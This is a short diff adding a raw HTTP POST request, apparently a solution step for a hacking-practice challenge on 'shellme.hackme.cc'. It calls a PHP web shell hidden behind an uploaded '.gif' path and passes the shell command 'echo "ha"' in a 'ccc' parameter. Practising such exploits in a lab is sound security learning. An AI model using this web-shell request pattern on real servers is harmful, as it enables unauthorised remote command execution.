@@ -1,0 +1,5 @@
+POST /sandbox/d43fb64b5ac2c506576c7b0998190b28/a.gif/a.php HTTP/1.1
+Host: shellme.hackme.cc
+Content-Length: 16
+
+ccc='echo "ha"'
